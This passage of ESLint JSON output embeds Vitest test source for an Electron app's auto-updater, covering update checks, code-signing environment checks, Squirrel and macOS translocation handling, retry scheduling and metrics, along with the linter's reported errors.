=> {\n      const validateCodeSigning = async (platform: string) => {\n        const config = PLATFORM_CONFIGS[platform as keyof typeof PLATFORM_CONFIGS]\n        \n        if (!config) {\n          throw new Error(`Unsupported platform: ${platform}`)\n        }\n\n        // Check if signing tools are available\n        const isSigningAvailable = await checkSigningTool(config.signatureTool)\n        \n        if (!isSigningAvailable && CI_ENVIRONMENTS.isGitHubActions) {\n          throw new Error(`Code signing required in CI but ${config.signatureTool} not found`)\n        }\n\n        // Validate environment variables\n        const requiredEnvVars = platform === 'win32' \n          ? ['CSC_LINK', 'CSC_KEY_PASSWORD']\n          : platform === 'darwin'\n          ? ['CSC_LINK', 'CSC_KEY_PASSWORD', 'APPLE_ID', 'APPLE_APP_SPECIFIC_PASSWORD']\n          : []\n\n        const missingVars = requiredEnvVars.filter(v => !process.env[v])\n        \n        if (missingVars.length > 0 && CI_ENVIRONMENTS.isGitHubActions) {\n          throw new Error(`Missing required environment variables: ${missingVars.join(', ')}`)\n        }\n\n        return { \n          canSign: isSigningAvailable && missingVars.length === 0,\n          platform,\n          tool: config.signatureTool\n        }\n      }\n\n      const checkSigningTool = async (): Promise<boolean> => {\n        // Mock check - in production would use 'which' or 'where' command\n        return true\n      }\n\n      const result = await validateCodeSigning(process.platform)\n      \n      expect(result).toHaveProperty('canSign')\n      expect(result).toHaveProperty('platform')\n      expect(result).toHaveProperty('tool')\n    })\n  })\n\n  describe('Cross-Platform Testing', () => {\n    test('should handle platform-specific update formats', async () => {\n      const getPlatformUpdateInfo = (platform: string) => {\n        const config = PLATFORM_CONFIGS[platform as keyof typeof PLATFORM_CONFIGS]\n        \n        if (!config) {\n          throw new Error(`Unsupported platform: ${platform}`)\n        }\n\n        return {\n          platform,\n          updateFile: config.updateFile,\n          installerType: config.installerType,\n          requiresElevation: config.requiresElevation,\n          updateUrl: `${serverUrl}/download/${config.updateFile}`\n        }\n      }\n\n      // Test each platform\n      for (const platform of ['win32', 'darwin', 'linux']) {\n        const info = getPlatformUpdateInfo(platform)\n        \n        expect(info.platform).toBe(platform)\n        expect(info.updateFile).toMatch(/\\.(exe|dmg|AppImage)$/)\n        expect(info.updateUrl).toContain(serverUrl)\n        \n        if (platform === 'win32') {\n          expect(info.requiresElevation).toBe(true)\n        }\n      }\n    })\n\n    test('should handle Squirrel.Windows first run', async () => {\n      const handleSquirrelEvents = async (): Promise<boolean> => {\n        if (process.platform !== 'win32') {\n          return false\n        }\n\n        const squirrelCommand = process.argv[1]\n        \n        switch (squirrelCommand) {\n          case '--squirrel-install':\n          case '--squirrel-updated':\n            // Create shortcuts, registry entries, etc.\n            console.log('Setting up application...')\n            app.quit()\n            return true\n            \n          case '--squirrel-uninstall':\n            // Clean up shortcuts, registry entries, etc.\n            console.log('Cleaning up application...')\n            app.quit()\n            return true\n            \n          case '--squirrel-obsolete':\n            app.quit()\n            return true\n            \n          case '--squirrel-firstrun':\n            // Don't check for updates immediately\n            console.log('First run detected, delaying update check...')\n            return true\n        }\n        \n        return false\n      }\n\n      // Simulate first run\n      process.argv[1] = '--squirrel-firstrun'\n      const isFirstRun = await handleSquirrelEvents()\n      \n      if (process.platform === 'win32') {\n        expect(isFirstRun).toBe(true)\n      } else {\n        expect(isFirstRun).toBe(false)\n      }\n      \n      // Reset argv\n      process.argv[1] = ''\n    })\n\n    test('should handle macOS app translocation', () => {\n      const isAppTranslocated = (): boolean => {\n        if (process.platform !== 'darwin') {\n          return false\n        }\n\n        // Check if app is running from a translocated path\n        const appPath = app.getPath('exe')\n        return appPath.includes('/AppTranslocation/')\n      }\n\n      const handleTranslocation = () => {\n        if (isAppTranslocated()) {\n          console.warn('App is translocated. Updates may not work correctly.')\n          console.warn('Please move the app to Applications folder.')\n          \n          // Could show a dialog to the user\n          return {\n            isTranslocated: true,\n            message: 'Please move TaskMaster to your Applications folder for updates to work correctly.'\n          }\n        }\n\n        return { isTranslocated: false }\n      }\n\n      const result = handleTranslocation()\n      \n      expect(result).toHaveProperty('isTranslocated')\n      if (result.isTranslocated) {\n        expect(result.message).toContain('Applications folder')\n      }\n    })\n  })\n\n  describe('Production Scenario Testing', () => {\n    test('should handle high-load update server scenario', async () => {\n      // Simulate server under load\n      mockServer.enableErrorSimulation(true)\n      mockServer['latency'] = 2000 // 2 second latency\n\n      const attemptUpdateWithRetry = async (maxRetries = 3): Promise<any> => {\n        let lastError: Error\n\n        for (let attempt = 0; attempt < maxRetries; attempt++) {\n          try {\n            // Add jitter to prevent thundering herd\n            const jitter = Math.random() * 1000\n            await new Promise(resolve => setTimeout(resolve, jitter))\n\n            const result = await autoUpdater.checkForUpdates()\n            return result\n          } catch (error) {\n            lastError = error as Error\n            console.log(`Update check failed (attempt ${attempt + 1}/${maxRetries}):`, error)\n            \n            // Exponential backoff\n            const backoff = Math.pow(2, attempt) * 1000\n            await new Promise(resolve => setTimeout(resolve, backoff))\n          }\n        }\n\n        throw lastError!\n      }\n\n      // Mock intermittent failures\n      let callCount = 0\n      (autoUpdater as MockAutoUpdater).checkForUpdates.mockImplementation(() => {\n        callCount++\n        if (callCount < 2) {\n          throw new Error('Server timeout')\n        }\n        return Promise.resolve({ updateInfo: { version: '2.0.0' }, cancellationToken: undefined })\n      })\n\n      const result = await attemptUpdateWithRetry()\n      \n      expect(callCount).toBeGreaterThanOrEqual(2)\n      expect(result).toHaveProperty('updateInfo')\n    })\n\n    test('should implement update scheduling', async () => {\n      const scheduleUpdate = (options: {\n        checkInterval: number\n        allowedHours?: { start: number; end: number }\n        skipWeekends?: boolean\n      }) => {\n        const { checkInterval, allowedHours, skipWeekends } = options\n\n        const shouldCheckNow = (): boolean => {\n          const now = new Date()\n          const hour = now.getHours()\n          const day = now.getDay()\n\n          // Skip weekends if configured\n          if (skipWeekends && (day === 0 || day === 6)) {\n            return false\n          }\n\n          // Check allowed hours\n          if (allowedHours) {\n            if (hour < allowedHours.start || hour >= allowedHours.end) {\n              return false\n            }\n          }\n\n          return true\n        }\n\n        const scheduleNextCheck = () => {\n          if (shouldCheckNow()) {\n            autoUpdater.checkForUpdates()\n          }\n\n          // Schedule next check\n          setTimeout(scheduleNextCheck, checkInterval)\n        }\n\n        return { shouldCheckNow, scheduleNextCheck }\n      }\n\n      const scheduler = scheduleUpdate({\n        checkInterval: 4 * 60 * 60 * 1000, // 4 hours\n        allowedHours: { start: 9, end: 17 }, // 9 AM to 5 PM\n        skipWeekends: true\n      })\n\n      // Test scheduling logic\n      const mockDate = new Date('2025-01-15T10:00:00') // Wednesday 10 AM\n      vi.setSystemTime(mockDate)\n      \n      expect(scheduler.shouldCheckNow()).toBe(true)\n\n      // Test weekend skip\n      const weekend = new Date('2025-01-18T10:00:00') // Saturday\n      vi.setSystemTime(weekend)\n      \n      expect(scheduler.shouldCheckNow()).toBe(false)\n\n      vi.useRealTimers()\n    })\n\n    test('should collect and report update metrics', async () => {\n      const updateMetrics = {\n        checkCount: 0,\n        downloadCount: 0,\n        installCount: 0,\n        errorCount: 0,\n        totalDownloadTime: 0,\n        averageDownloadSpeed: 0,\n        userActions: [] as Array<{ action: string; timestamp: Date }>\n      }\n\n      const trackMetric = (metric: keyof typeof updateMetrics, value: number = 1) => {\n        if (typeof updateMetrics[metric] === 'number') {\n          (updateMetrics[metric] as number) += value\n        }\n      }\n\n      const trackUserAction = (action: string) => {\n        updateMetrics.userActions.push({\n          action,\n          timestamp: new Date()\n        })\n      }\n\n      // Simulate update flow with metrics\n      trackMetric('checkCount')\n      await autoUpdater.checkForUpdates()\n\n      trackUserAction('update-accepted')\n      trackMetric('downloadCount')\n      \n      const downloadStart = Date.now()\n      await autoUpdater.downloadUpdate()\n      const downloadTime = Date.now() - downloadStart\n      \n      trackMetric('totalDownloadTime', downloadTime)\n      trackUserAction('install-initiated')\n      trackMetric('installCount')\n\n      // Calculate average download speed (mock)\n      updateMetrics.averageDownloadSpeed = 50000000 / (downloadTime / 1000) // bytes/second\n\n      // Generate report\n      const generateMetricsReport = () => ({\n        summary: {\n          totalChecks: updateMetrics.checkCount,\n          successfulDownloads: updateMetrics.downloadCount,\n          successfulInstalls: updateMetrics.installCount,\n          errors: updateMetrics.errorCount,\n          downloadSuccessRate: (updateMetrics.downloadCount / updateMetrics.checkCount) * 100,\n          installSuccessRate: (updateMetrics.installCount / updateMetrics.downloadCount) * 100\n        },\n        performance: {\n          averageDownloadTime: updateMetrics.totalDownloadTime / updateMetrics.downloadCount,\n          averageDownloadSpeed: updateMetrics.averageDownloadSpeed / 1024 / 1024 // MB/s\n        },\n        userBehavior: {\n          totalActions: updateMetrics.userActions.length,\n          actions: updateMetrics.userActions\n        }\n      })\n\n      const report = generateMetricsReport()\n      \n      expect(report.summary.totalChecks).toBe(1)\n      expect(report.summary.successfulDownloads).toBe(1)\n      expect(report.userBehavior.totalActions).toBeGreaterThan(0)\n    })\n  })\n})","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/auto-updater-security.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/auto-updater.test.ts","messages":[{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":504,"column":7,"nodeType":"Literal","messageId":"function","endLine":504,"endColumn":8}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Auto-Updater Testing (2025)\n * \n * Comprehensive testing of Electron auto-updater functionality including\n * update checking, download progress, error handling, rollback scenarios,\n * and security validation following 2025 best practices.\n */\n\nimport { describe, test, expect, beforeEach, afterEach, vi } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { autoUpdater } from 'electron-updater'\nimport { app, BrowserWindow, dialog } from 'electron'\nimport type { MockAutoUpdater } from './mock-types'\n\n\n// Mock electron-updater module\nvi.mock('electron-updater', () => ({\n  autoUpdater: {\n    checkForUpdates: vi.fn().mockResolvedValue({\n      updateInfo: {\n        version: '2.0.0',\n        releaseDate: new Date().toISOString(),\n        releaseNotes: 'New features and bug fixes'\n      },\n      cancellationToken: undefined,\n        isUpdateAvailable: true,\n        versionInfo: { version: \"2.0.0\" }\n    }),\n    checkForUpdatesAndNotify: vi.fn().mockResolvedValue(undefined),\n    downloadUpdate: vi.fn().mockResolvedValue(undefined),\n    quitAndInstall: vi.fn(),\n    \n    // Event emitter methods\n    on: vi.fn(),\n    once: vi.fn(),\n    removeListener: vi.fn(),\n    removeAllListeners: vi.fn(),\n    emit: vi.fn(),\n    \n    // Configuration properties\n    autoDownload: false,\n    autoInstallOnAppQuit: true,\n    allowPrerelease: false,\n    allowDowngrade: false,\n    channel: 'latest',\n    \n    // Logger configuration\n    logger: {\n      transports: {\n        file: { level: 'info' },\n        console: { level: 'info' }\n      },\n      info: vi.fn(),\n      warn: vi.fn(),\n      error: vi.fn()\n    },\n    \n    // Feed URL\n    setFeedURL: vi.fn(),\n    getFeedURL: vi.fn().mockReturnValue('https://example.com/updates')\n  }\n}))\n\n// Mock electron modules\nvi.mock('electron', () => ({\n  app: {\n    isPackaged: false,\n    getVersion: vi.fn().mockReturnValue('1.0.0'),\n    quit: vi.fn(),\n    relaunch: vi.fn(),\n    getPath: vi.fn().mockImplementation((name) => `/mock/path/${name}`)\n  },\n  BrowserWindow: {\n    getAllWindows: vi.fn().mockReturnValue([]),\n    getFocusedWindow: vi.fn().mockReturnValue(null)\n  },\n  dialog: {\n    showMessageBox: vi.fn().mockResolvedValue({ response: 0 }),\n    showErrorBox: vi.fn()\n  }\n}))\n\ndescribe('Auto-Updater Tests (2025)', () => {\n  beforeEach(() => {\n    vi.clearAllMocks()\n    \n    // Reset auto-updater configuration\n    autoUpdater.autoDownload = false\n    autoUpdater.autoInstallOnAppQuit = true\n  })\n\n  afterEach(() => {\n    vi.restoreAllMocks()\n  })\n\n  describe('Update Checking', () => {\n    test('should check for updates on app start in production', async () => {\n      // Mock production environment\n      Object.defineProperty(app, 'isPackaged', { value: true, writable: false })\n      \n      // Initialize auto-updater\n      const initAutoUpdater = async () => {\n        if (app.isPackaged) {\n          await autoUpdater.checkForUpdatesAndNotify()\n        }\n      }\n      \n      await initAutoUpdater()\n      \n      expect(autoUpdater.checkForUpdatesAndNotify).toHaveBeenCalled()\n    })\n\n    test('should not check for updates in development', async () => {\n      // Mock development environment\n      Object.defineProperty(app, 'isPackaged', { value: false, writable: false })\n      \n      const initAutoUpdater = async () => {\n        if (app.isPackaged) {\n          await autoUpdater.checkForUpdatesAndNotify()\n        }\n      }\n      \n      await initAutoUpdater()\n      \n      expect(autoUpdater.checkForUpdatesAndNotify).not.toHaveBeenCalled()\n    })\n\n    test('should handle manual update check', async () => {\n      const result = await autoUpdater.checkForUpdates()\n      \n      expect(autoUpdater.checkForUpdates).toHaveBeenCalled()\n      expect(result).toHaveProperty('updateInfo')\n      expect(result?.updateInfo).toHaveProperty('version', '2.0.0')\n    })\n\n    test('should configure update feed URL', () => {\n      const feedUrl = 'https://updates.example.com/feed'\n      \n      autoUpdater.setFeedURL(feedUrl)\n      \n      expect(autoUpdater.setFeedURL).toHaveBeenCalledWith(feedUrl)\n      expect(autoUpdater.getFeedURL()).toBe('https://example.com/updates')\n    })\n  })\n\n  describe('Update Event Handling', () => {\n    test('should handle checking-for-update event', () => {\n      const mockHandler = vi.fn()\n      \n      autoUpdater.on('checking-for-update', mockHandler)\n      \n      expect(autoUpdater.on).toHaveBeenCalledWith('checking-for-update', mockHandler)\n      \n      // Simulate event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'checking-for-update'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback()\n        expect(mockHandler).toHaveBeenCalled()\n      }\n    })\n\n    test('should handle update-available event', () => {\n      const mockHandler = vi.fn()\n      const updateInfo = {\n        version: '2.0.0',\n        releaseDate: new Date().toISOString(),\n        releaseNotes: 'New features'\n      }\n      \n      autoUpdater.on('update-available', mockHandler)\n      \n      // Simulate event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'update-available'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(updateInfo)\n        expect(mockHandler).toHaveBeenCalledWith(updateInfo)\n      }\n    })\n\n    test('should handle update-not-available event', () => {\n      const mockHandler = vi.fn()\n      const updateInfo = {\n        version: '1.0.0',\n        releaseDate: new Date().toISOString()\n      }\n      \n      autoUpdater.on('update-not-available', mockHandler)\n      \n      // Simulate event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'update-not-available'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(updateInfo)\n        expect(mockHandler).toHaveBeenCalledWith(updateInfo)\n      }\n    })\n\n    test('should handle download-progress event', () => {\n      const mockHandler = vi.fn()\n      const progressInfo = {\n        bytesPerSecond: 1000000,\n        percent: 50,\n        transferred: 50000000,\n        total: 100000000\n      }\n      \n      autoUpdater.on('download-progress', mockHandler)\n      \n      // Simulate event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'download-progress'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(progressInfo)\n        expect(mockHandler).toHaveBeenCalledWith(progressInfo)\n      }\n    })\n\n    test('should handle update-downloaded event', () => {\n      const mockHandler = vi.fn()\n      const updateInfo = {\n        version: '2.0.0',\n        releaseDate: new Date().toISOString(),\n        releaseNotes: 'New features'\n      }\n      \n      autoUpdater.on('update-downloaded', mockHandler)\n      \n      // Simulate event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'update-downloaded'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(updateInfo)\n        expect(mockHandler).toHaveBeenCalledWith(updateInfo)\n      }\n    })\n  })\n\n  describe('Error Handling', () => {\n    test('should handle update errors gracefully', () => {\n      const mockErrorHandler = vi.fn()\n      const updateError = new Error('Network error')\n      \n      autoUpdater.on('error', mockErrorHandler)\n      \n      // Simulate error event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'error'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(updateError)\n        expect(mockErrorHandler).toHaveBeenCalledWith(updateError)\n      }\n    })\n\n    test('should log errors appropriately', () => {\n      const mockErrorHandler = vi.fn((error) => {\n        autoUpdater.logger?.error('Auto-updater error: ' + error.message)\n      })\n      \n      autoUpdater.on('error', mockErrorHandler)\n      \n      // Simulate error\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'error'\n      )?.[1]\n      \n      if (eventCallback) {\n        const error = new Error('Update failed')\n        eventCallback(error)\n        \n        expect(autoUpdater.logger?.error).toHaveBeenCalledWith('Auto-updater error:', error)\n      }\n    })\n\n    test('should handle network timeout errors', () => {\n      const mockErrorHandler = vi.fn()\n      const timeoutError = new Error('ETIMEDOUT') as Error & { code?: string }\n      timeoutError.code = 'ETIMEDOUT'\n      \n      autoUpdater.on('error', mockErrorHandler)\n      \n      // Simulate timeout error\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'error'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(timeoutError)\n        expect(mockErrorHandler).toHaveBeenCalledWith(timeoutError)\n      }\n    })\n\n    test('should handle signature verification errors', () => {\n      const mockErrorHandler = vi.fn()\n      const signatureError = new Error('Could not verify signature')\n      \n      autoUpdater.on('error', mockErrorHandler)\n      \n      // Simulate signature error\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'error'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(signatureError)\n        expect(mockErrorHandler).toHaveBeenCalledWith(signatureError)\n      }\n    })\n  })\n\n  describe('User Interaction', () => {\n    test('should prompt user when update is available', async () => {\n      const mockWindow = {} as any\n      BrowserWindow.getFocusedWindow = vi.fn().mockReturnValue(mockWindow)\n      \n      const promptUserForUpdate = async (info: { version: string }) => {\n        const result = await dialog.showMessageBox({\n                      id: 1,\n                      webContents: {\n                        send: vi.fn(),\n                        on: vi.fn(),\n                        once: vi.fn(),\n                        removeListener: vi.fn()\n                      },\n                      on: vi.fn(),\n                      off: vi.fn(),\n                      once: vi.fn(),\n                      addListener: vi.fn(),\n                      removeListener: vi.fn(),\n                      show: vi.fn(),\n                      hide: vi.fn(),\n                      close: vi.fn(),\n                      destroy: vi.fn(),\n                      isDestroyed: vi.fn().mockReturnValue(false),\n                      focus: vi.fn(),\n                      blur: vi.fn()\n                    } as any, {\n          type: 'info',\n          title: 'Update Available',\n          message: 'A new version is available. Would you like to download it now?',\n          detail: `Version ${info.version} is available.`,\n          buttons: ['Download', 'Later'],\n          defaultId: 0,\n          cancelId: 1\n        })\n        \n        return result.response === 0\n      }\n      \n      const shouldDownload = await promptUserForUpdate({ version: '2.0.0' })\n      \n      expect(dialog.showMessageBox).toHaveBeenCalledWith(\n        mockWindow,\n        expect.objectContaining({\n          type: 'info',\n          title: 'Update Available'\n        })\n      )\n      \n      expect(shouldDownload).toBe(true) // Default mock returns response: 0\n    })\n\n    test('should handle user declining update', async () => {\n      dialog.showMessageBox = vi.fn().mockResolvedValue({ response: 1 }) // User clicks \"Later\"\n      \n      const promptUserForUpdate = async (info: { version: string }) => {\n        const result = await dialog.showMessageBox({\n                      id: 1,\n                      webContents: {\n                        send: vi.fn(),\n                        on: vi.fn(),\n                        once: vi.fn(),\n                        removeListener: vi.fn()\n                      },\n                      on: vi.fn(),\n                      off: vi.fn(),\n                      once: vi.fn(),\n                      addListener: vi.fn(),\n                      removeListener: vi.fn(),\n                      show: vi.fn(),\n                      hide: vi.fn(),\n                      close: vi.fn(),\n                      destroy: vi.fn(),\n                      isDestroyed: vi.fn().mockReturnValue(false),\n                      focus: vi.fn(),\n                      blur: vi.fn()\n                    } as any, {\n          type: 'info',\n          title: 'Update Available',\n          message: 'A new version is available. Would you like to download it now?',\n          detail: `Version ${info.version} is available.`,\n          buttons: ['Download', 'Later'],\n          defaultId: 0,\n          cancelId: 1\n        })\n        \n        return result.response === 0\n      }\n      \n      const shouldDownload = await promptUserForUpdate({ version: '2.0.0' })\n      \n      expect(shouldDownload).toBe(false)\n    })\n\n    test('should prompt for restart after download', async () => {\n      const promptUserToInstall = async () => {\n        const result = await dialog.showMessageBox({\n                      id: 1,\n                      webContents: {\n                        send: vi.fn(),\n                        on: vi.fn(),\n                        once: vi.fn(),\n                        removeListener: vi.fn()\n                      },\n                      on: vi.fn(),\n                      off: vi.fn(),\n                      once: vi.fn(),\n                      addListener: vi.fn(),\n                      removeListener: vi.fn(),\n                      show: vi.fn(),\n                      hide: vi.fn(),\n                      close: vi.fn(),\n                      destroy: vi.fn(),\n                      isDestroyed: vi.fn().mockReturnValue(false),\n                      focus: vi.fn(),\n                      blur: vi.fn()\n                    } as any, {\n          type: 'info',\n          title: 'Update Ready',\n          message: 'Update downloaded. Restart the application to apply the update.',\n          buttons: ['Restart Now', 'Later'],\n          defaultId: 0,\n          cancelId: 1\n        })\n        \n        if (result.response === 0) {\n          autoUpdater.quitAndInstall()\n        }\n      }\n      \n      await promptUserToInstall()\n      \n      expect(dialog.showMessageBox).toHaveBeenCalledWith(\n        expect.any(Object),\n        expect.objectContaining({\n          title: 'Update Ready'\n        })\n      )\n      \n      expect(autoUpdater.quitAndInstall).toHaveBeenCalled()\n    })\n  })\n\n  describe('Security and Validation', () => {\n    test('should disable auto-download by default', () => {\n      expect(autoUpdater.autoDownload).toBe(false)\n    })\n\n    test('should enable auto-install on app quit', () => {\n      expect(autoUpdater.autoInstallOnAppQuit).toBe(true)\n    })\n\n    test('should not allow prereleases by default', () => {\n      expect(autoUpdater.allowPrerelease).toBe(false)\n    })\n\n    test('should not allow downgrades by default', () => {\n      expect(autoUpdater.allowDowngrade).toBe(false)\n    })\n\n    test('should use stable update channel', () => {\n      expect(autoUpdater.channel).toBe('latest')\n    })\n\n    test('should handle update channel configuration', () => {\n      // Test switching to beta channel\n      (autoUpdater as any).channel = 'beta'\n      (autoUpdater as any).allowPrerelease = true\n      \n      expect(autoUpdater.channel).toBe('beta')\n      expect(autoUpdater.allowPrerelease).toBe(true)\n    })\n  })\n\n  describe('Download Management', () => {\n    test('should download update when requested', async () => {\n      await autoUpdater.downloadUpdate()\n      \n      expect(autoUpdater.downloadUpdate).toHaveBeenCalled()\n    })\n\n    test('should track download progress', () => {\n      const progressHandler = vi.fn()\n      let lastProgress = 0\n      \n      autoUpdater.on('download-progress', progressHandler)\n      \n      // Simulate progressive download\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'download-progress'\n      )?.[1]\n      \n      if (eventCallback) {\n        // Simulate progress updates\n        const progressSteps = [25, 50, 75, 100]\n        \n        progressSteps.forEach(percent => {\n          eventCallback({\n            bytesPerSecond: 1000000,\n            percent,\n            transferred: (percent / 100) * 100000000,\n            total: 100000000\n          })\n          \n          lastProgress = percent\n        })\n        \n        expect(progressHandler).toHaveBeenCalledTimes(4)\n        expect(lastProgress).toBe(100)\n      }\n    })\n\n    test('should handle download cancellation', () => {\n      // Mock cancellation token\n      const cancellationToken = {\n        cancel: vi.fn()\n      }\n      \n      autoUpdater.checkForUpdates = vi.fn().mockResolvedValue({\n        updateInfo: { version: '2.0.0' },\n        cancellationToken,\n          isUpdateAvailable: true,\n          versionInfo: { version: \"2.0.0\" }\n    })\n      \n      // In a real scenario, you would cancel the download\n      cancellationToken.cancel()\n      \n      expect(cancellationToken.cancel).toHaveBeenCalled()\n    })\n  })\n\n  describe('Rollback and Recovery', () => {\n    test('should handle failed installation gracefully', () => {\n      const mockErrorHandler = vi.fn((error) => {\n        // Log error and notify user\n        autoUpdater.logger?.error('Installation failed:', error)\n        dialog.showErrorBox('Update Failed', 'The update could not be installed.')\n      })\n      \n      autoUpdater.on('error', mockErrorHandler)\n      \n      // Simulate installation error\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'error'\n      )?.[1]\n      \n      if (eventCallback) {\n        const installError = new Error('Installation failed')\n        eventCallback(installError)\n        \n        expect(autoUpdater.logger?.error).toHaveBeenCalledWith('Installation failed: ' + installError.message)\n        expect(dialog.showErrorBox).toHaveBeenCalledWith('Update Failed', 'The update could not be installed.')\n      }\n    })\n\n    test('should maintain app stability after update failure', () => {\n      const mockErrorHandler = vi.fn()\n      \n      autoUpdater.on('error', mockErrorHandler)\n      \n      // Simulate error\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'error'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback(new Error('Update failed'))\n        \n        // App should not quit automatically on error\n        expect(app.quit).not.toHaveBeenCalled()\n      }\n    })\n  })\n\n  describe('Logging and Monitoring', () => {\n    test('should log update check attempts', () => {\n      const logHandler = vi.fn(() => {\n        autoUpdater.logger?.info('Checking for updates...')\n      })\n      \n      autoUpdater.on('checking-for-update', logHandler)\n      \n      // Trigger event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'checking-for-update'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback()\n        expect(autoUpdater.logger?.info).toHaveBeenCalledWith('Checking for updates...')\n      }\n    })\n\n    test('should log update availability', () => {\n      const logHandler = vi.fn((info) => {\n        autoUpdater.logger?.info(`Update available: ${info.version}`)\n      })\n      \n      autoUpdater.on('update-available', logHandler)\n      \n      // Trigger event\n      const eventCallback = (autoUpdater as MockAutoUpdater).on.mock.calls.find(\n        call => call[0] === 'update-available'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback({ version: '2.0.0' })\n        expect(autoUpdater.logger?.info).toHaveBeenCalledWith('Update available: 2.0.0')\n      }\n    })\n  })\n})","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/baseline.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/cross-process-communication.test.ts","messages":[{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":54,"column":1,"nodeType":"CallExpression","messageId":"function","endLine":54,"endColumn":2},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":287,"column":48,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":287,"endColumn":56},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":317,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":317,"endColumn":59,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[10098,10098],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[10098,10098],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":325,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":325,"endColumn":80,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[10323,10323],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[10323,10323],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":336,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":336,"endColumn":82,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[10652,10652],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[10652,10652],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":344,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":344,"endColumn":89,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[10912,10912],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[10912,10912],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":462,"column":51,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":462,"endColumn":59},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":498,"column":55,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":498,"endColumn":63},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return 